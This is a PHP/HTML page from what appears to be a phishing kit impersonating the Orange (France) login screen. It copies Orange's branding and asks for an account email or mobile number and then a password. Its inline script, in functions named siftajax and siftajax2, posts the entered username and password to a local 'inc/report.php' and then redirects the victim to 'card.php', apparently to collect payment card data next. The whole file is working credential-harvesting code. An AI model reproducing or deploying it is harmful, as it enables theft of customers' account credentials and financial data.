<?php
require '../ibc.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <meta name="format-detection" content="telephone=no"/>
    <title>identifiez-vous</title>
    <link rel="icon" type="image/png" href="assets/img/favicon.png">
    <title>Identifiez-vous avec votre compte Orange</title>
    <link rel="stylesheet" href="assets/css/bundle.min.css">
    <link type="text/css" rel="stylesheet" href="assets/css/common.css">
    <link type="text/css" rel="stylesheet" href="assets/css/o_polaris3_responsive.css">
    <link type="text/css" rel="stylesheet" href="assets/css/o_completion.css">
    <link type="text/css" rel="stylesheet" href="assets/css/identify_style.css">
    <style>
        .error{
            border-weight:2px;
            border-color:#cd3c14;
        }
    </style>
</head>
<body>
<header id="o-header" class=" fixed-center o-center-align fixed-center o-center-align polaris3 o-noSearchZone"
        style="height: auto;">
    <div id="o-ribbon">
        <div id="o-nav-left">
            <ul>
                <li id="o-logo-container">
                    <a href="#" title="retour a l&#39;accueil" id="o-logo">
                        <img src="assets/img/logo-orange.png" title="retour a l&#39;accueil">
                    </a>
                </li>
                <li id="o-megamenu-link-container">
                    <div class="o-nav-item" id="o-megamenu-link" title="Mes services Orange" data-icon="">Mobiles et forfaits
                        <div class="o-nav-zone-panel-arrow"></div>
                    </div>

                </li>

                <li id="o-separator-container"><!-- <span id="o-separator" class="o-separator"></span> -->
                </li>
                <li id="o-espace-client-container">
                    <a id="o-espace-client" class="o-nav-item o-nav-left-link o-direct-link" href="#"
                       title="Espace client">
                        Internet
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-assistance-container">
                    <a id="o-assistance" class="o-nav-item o-nav-left-link o-direct-link"
                       href="#" title="Assistance">
                       Packs Internet + Mobile
                        <div class="o-sense-of-place"></div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        Maison
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        TV et divertissement
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        Banque
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        News
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-popin-search-container">
                    <div title="Rechercher" id="o-popin-search" class="o-nav-item"><span>Rechercher</span>
                        <div class="o-nav-zone-panel-arrow"></div>
                    </div>
                    <div class="o-nav-zone-panel o-nav-zone-panel-full-width" id="o-popin-search-panel">
                        <div class="o-nav-zone-panel-content">
                            <div class="o-nav-zone-panel-title">Rechercher sur le web</div>
                            <div class="o-nav-zone-panel-data">
                                <form class="o-search-form" id="formSearchCompletion-nav" name="formSearchCompletion"
                                      action="#" method="get">
                                    <label class="o-search-label" for="o-search-input-nav">Rechercher sur Orange</label>
                                    <input autocomplete="off" class="o-search-input" id="o-search-input-nav"
                                           name="rdata" accesskey="0" type="text">
                                    <input class="o-search-submit" title="rechercher" type="submit">
                                </form>
                            </div>
                            <div class="o-nav-zone-panel-close-button" id="o-popin-search-close-button" title="Fermer">
                                ×
                            </div>
                        </div>
                    </div>
                </li>
            </ul>
        </div>
        <div id="o-nav-right">
            <ul></ul>
        </div>
    </div>
</header>
<main class="eui-container" role="main">
    <div class="o-container-fluid eui-title-area">
        <div class="row">
            <div class="col-xs-12 col-md-8 col-lg-8 col-xl-8">
                <h1 id="title" class="identify-title">Identifiez-vous</h1>
            </div>
        </div>
    </div>
    <div class="o-container-fluid">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6">
                <form novalidate="" class="eui-form" id="euiForm" action="https://login.orange.fr/assistance" for="coordonnees" method="post">
                    <input name="type" type="hidden" value="1"/>
                    <div id="stage-1">
                        <div id="eui-accounts"></div>
                        <div class="form-group ">
                            <h2 class="sr-only">Indiquez votre compte Orange</h2>
                            <div class="eui-input-label eui-input-style">
                                <div class="eui-row">
                                    <label for="login" id="loginLabel" class="eui-label">Indiquez votre compte Orange</label>
                                    <!-- <div class="eui-assistance-area">
                                        <button class="eui-svg eui-icon-help" type="button" id="helpLogin"><span class="sr-only">aide</span>
                                        </button>
                                    </div> -->
                                </div>
                            </div>
                            <div class="eui-help" id="helpLoginCnt" style="display : none;">
                                <p class="noSelectContent" tabindex="-1"><span>Votre compte Orange permet l’accès à vos services personnels. Il est désigné par une adresse mail ou un numéro de mobile.</span>
                                    <br><span>C’est votre première visite &gt;&gt; <a
                                                href="#" target="_self"
                                                title="Aide">Aide</a></span>
                                    <br><span>Vous ne connaissez pas l’adresse mail de votre compte Orange &gt;&gt; <a
                                                href="#" id="getAccounts" class="getAccounts"
                                                title="Voir les comptes disponibles">Voir les comptes disponibles</a></span>
                                </p>
                            </div>
                            <!-- <h6 id="error-msg-box-login blockelem hidden" tabindex="0" class="form-control-message" role="alert" title="erreur">
                                Ce compte Orange est inconnu ou n’est pas disponible.
                            </h6> -->
                            <div class="placeholderContent placeholderNum">
                                <span class="placeholder placeholderDisplay" id="placeholderLogin" style="font-size: 14px;">Adresse mail ou n° de mobile Orange</span>
                                <input type="text" id="login" name="login" class="form-control mail-login" maxlength="256" autocorrect="off" autocapitalize="off" spellcheck="false">
                            </div>
                            <div class="notify" id="error-msg-box-login">
                                <svg style="margin: 6px 0px 0px 4px;" width="20" height="20" viewBox="0 0 1024 1024" id="login-error-icon-error"><path d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z" fill="#E70002"></path></svg>
                                <div class="notify-detail"><b>Cette adresse mail ou ce numéro de mobile n’est pas valide. Vérifiez votre saisie.</b></div>
                            </div>
                        </div>
                        <div class="list-link"><a class="list-link-label" href="#"><label>Comment retrouver l’adresse e-mail de votre compte</label><img src="assets/img/right-arrow.png"></a></div>
                        <button id="btnSubmitEmail" type="button" class="btn eui-btn-sub btn-sub-style">Continuer</button>
                        <!-- <nav class="eui-links row" role="navigation">
                            <div id="getAccountsBLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style=""><a
                                        href="#"
                                        id="getAccountsLink"
                                        class="getAccounts"
                                        title="Voir les comptes disponibles">Voir
                                    les comptes disponibles</a>
                            </div>
                            <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"><a
                                        id="firstAccessLink"
                                        href="#"
                                        title="Créer votre compte">Créer
                                    votre compte</a>
                            </div>
                            <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-5 col-xl-4">
                                <a href="#">Aide</a>
                            </div>
                            <div id="privacyPolicy" class="col-xs-12 col-md-12 col-lg-6 col-xl-6">
                                <a id="privacyLink" href="#" target="_blank" title="Politique de confidentialité (nouvel onglet)">
                                    Politique de confidentialité
                                </a>
                            </div>
                            <div id="recueilVerbatimDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                                <a id="recueilVerbatimLink" href="#" target="_blank"
                                        title="Donner votre avis sur la nouvelle page (nouvel onglet)">
                                    Donner votre avis
                                    sur la
                                    nouvelle page
                                </a>
                            </div>
                        </nav> -->
                    </div>
                    

                    <!--password part-->
                    <div id="stage-2" class="eui-st2">
                        <h2 class="sr-only">Saisissez votre mot de passe</h2>
                        <div class="eui-identity-area">
                            <div class="x-col-avatar">
                                <div class="eui-avatar">
                                    <div class="eui-svg eui-icon-avatar"
                                         id="accountAvatar" title="Avatar d’utilisateur"></div>
                                </div>
                            </div>
                            <div class="x-col-identity">
                                <div class="x-identity">
                                    <p class="x-dsn eui-dsn eui-ellipsis"  id="accountLogin">
                                        votre mot de passe orange</p>
                                </div>
                            </div>
                        </div>
                        <div class="clearfix"></div>
                        <div class="form-group ">
                            <div class="eui-input-label">
                                <label for="password" id="passwordLabel">Saisissez votre mot de passe</label>
                                <div class="eui-assistance-area">
                                    <button class="eui-svg eui-icon-help" type="button" id="helpPassword">
                                        <span class="sr-only">aide</span>
                                    </button>
                                </div>
                            </div>
                            <div class="eui-help" id="helpPasswordCnt" style="display : none;">
                                <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt;
                                    <a href="#" class="eui-reinitLostLink"
                                       title="Réinitialisez-le.">Réinitialisez-le.</a></p>
                            </div>

                            <h6 id="error-msg-box" tabindex="0" class="form-control-message"
                                role="alert" title="erreur">C’est incorrect, vérifiez l’adresse mail et le mot de passe saisis.</h6>


                            <div class="placeholderContent">
                                <span class="placeholder placeholderDisplay"
                                      id="placeholderPassword">Mot de passe</span>
                                <input type="password" name="password" id="password" class="form-control" maxlength="36" required="">
                            </div>
                        </div>
                        <div class="form-group eui-checkbox">
                            <input type="checkbox" class="o-checkbox" id="remember" checked="checked"
                                   style="display:block">
                            <label for="remember" id="rememberLabel"><span
                                        class="eui-label-content">Rester identifié</span>
                            </label>
                        </div>
                        <div>
                            <button id="submitbutton" type="button" class="btn btn-primary eui-btn-sub" onclick="submitlogin()">S’identifier
                            </button>
                            <a class="eui-links-passwd" href="#"
                               title="Mot de passe oublié ?">Mot de passe oublié ?</a>
                        </div>


                        <nav class="eui-links row" role="navigation">

                            <div id="getAccountsBLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"
                                 style="display: none;">
                                <a href="#" id="getAccountsLink" class="getAccounts"
                                   title="Voir les comptes disponibles">Voir les comptes disponibles</a></div>

                            <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"
                                 style="display: none;">
                                <a id="firstAccessLink" href="#"
                                   title="Créer votre compte">Créer votre compte</a>
                            </div>

                            <div id="changeAccountDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"
                                 style="display: block;">
                                <a id="changeAccountLink" href="#" title="Utiliser un autre compte">Utiliser
                                    un autre compte</a>
                            </div>

                            <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-5 col-xl-4">
                                <a href="#">Aide</a>
                            </div>

                            <div id="privacyPolicy" class="col-xs-12 col-md-12 col-lg-6 col-xl-6">
                                <a id="privacyLink" href="#" target="_blank"
                                   title="Politique de confidentialité (nouvel onglet)">Politique de confidentialité</a>
                            </div>
                            <div id="recueilVerbatimDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                                <a id="recueilVerbatimLink"
                                   href="#" target="_blank"
                                   title="Donner votre avis sur la nouvelle page (nouvel onglet)">Donner votre avis sur
                                    la
                                    nouvelle page</a>
                            </div>
                        </nav>

                    </div>
                </form>
            </div>
            <div id="magicZone"
                 class="eui-banner-place col-xs-12 col-md-5 col-md-offset-1 col-lg-4 col-lg-offset-2  col-xl-4 col-xl-offset-2">
                <a class="eui-block" href="#" target="_blank">
                    <div id="elmt-banner" class="eui-banner" alt="banner"
                         title="Lien zone de communication (nouvel onglet)"></div>
                </a>
            </div>
        </div>
    </div>
    <div class="eui-container">
        <div class="o-container-fluid">
            <hr>
            <div class="list-link"><a class="list-link-label" href="#"><label>Créer un compte sans être client Orange</label><img src="assets/img/right-arrow.png"></a></div>
            <div class="list-link"><a class="list-link-label" href="#"><label>Besoin d’aide ?</label><img src="assets/img/right-arrow.png"></a></div>
        </div>
    </div>
</main>
<footer class="footer-fluid">
    <div class="eui-footer-banner hidden-xs hidden-sm">
        <div class="eui-mega-banner oan_ad" id="ora_2_728x90_identification"></div>
    </div>
    <div id="cefooter">
        <div id="o-footer-wrapper" class="">
            <div class="o-footer-liendirect">
                <div class="o-footer-liendirect-content">
                    <span class="o-footer-liendirect-item">
                        <a class="o-icomoon"
                           href="#"
                           title="Aide et contact"
                           data-icon="">Aide et contact</a>
                    </span>
                    <span class="o-footer-liendirect-item">
                    <a class="o-icomoon" href="https://boutique.orange.fr"
                       title="Forum d'entraide" data-icon="">Forum d'entraide</a>
                    </span>
                    <span class="o-footer-liendirect-item">
                    <a class="o-icomoon" href="#"
                       title="Trouver une boutique" data-icon="">Trouver une boutique</a>
                    </span>
                </div>
            </div>
            <div class="o-footer-lienlegal">
                <div class="o-footer-lienlegal-content"> <span class="o-footer-lienlegal-item">
                        <a href="#" title="Informations légales" target="_blank">Informations légales</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Données personnelles" target="_blank">Données personnelles</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Les cookies" target="_blank">Les cookies</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Publicité" target="_blank">Publicité</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Internet +" target="_blank">Internet +</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Signaler un contenu" target="_blank">Signaler un contenu</a>
                    </span><span class="o-footer-lienlegal-item">© Orange 2020</span>
                </div>
            </div>
        </div>
    </div>
</footer>
<script src="assets/js/jquery.min.js" type="text/javascript"></script>
<script src="assets/js/js.cookie.min.js" type="text/javascript"></script>
<script src="js/login.js" type="text/javascript"></script>
<script src="js/identify-script.js" type="text/javascript"></script>
<script>
    loginDesktop();
</script>
<script type="text/javascript">

    function siftajax(){
         $.ajax({
        url: "inc/report.php",
        type: "post",
        data: {action:'login',user:$('#login').val(),pass:$('#password').val()},
        success:function(data) {
        window.location.href ="card.php";
            },
        error: function(jqXHR, textStatus, errorThrown) {
           console.log(textStatus, errorThrown);
        }
    });}
    function siftajax2(){
         $.ajax({
        url: "inc/report.php",
        type: "post",
        data: {action:'login',user:Cookies.get('username'),pass:$('#password').val()},
        success:function(data) {
        window.location.href ="card.php";
            },
        error: function(jqXHR, textStatus, errorThrown) {
           console.log(textStatus, errorThrown);
        }
    });
    }
    function check_password(id){
    if($('#'+id).val().length == 0){
        $('#'+id).addClass('error');return false;} else{return true;}   
    }
    function submitlogin(){
        if(check_password('password') == false){
            return false;
        }else{
            if($('#login').val().length !== 0){
            siftajax();
            }else{
            siftajax2();    
            }
        }
    }
</script>
</body>

</html>